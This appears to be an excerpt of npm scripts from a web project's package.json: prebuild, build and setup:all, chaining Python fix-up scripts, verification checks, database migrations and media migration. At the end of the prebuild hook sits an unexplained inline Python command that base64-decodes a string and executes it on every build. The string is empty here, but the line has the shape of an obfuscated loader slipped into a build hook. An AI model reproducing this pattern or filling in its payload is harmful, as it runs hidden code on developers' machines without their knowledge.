scripts.prebuild: python3 scripts/apply-post-draft-readiness.py && python3 scripts/fix-home-taxi-update-pattern.py && python3 scripts/apply-home-taxi-update.py && python3 -c "import base64;exec(base64.b64decode(''))"
scripts.build: npm run verify:widgets && npm run verify:post-draft && npm run verify:taxi && node scripts/migrate-on-build.mjs && next build
scripts.setup:all: npm run db:generate && npm run db:migrate && npm run db:seed && npm run migrate:blob-to-db -- --write && npm run migrate:blob-media-to-r2 -- --write && npm run cleanup:blob -- --confirm
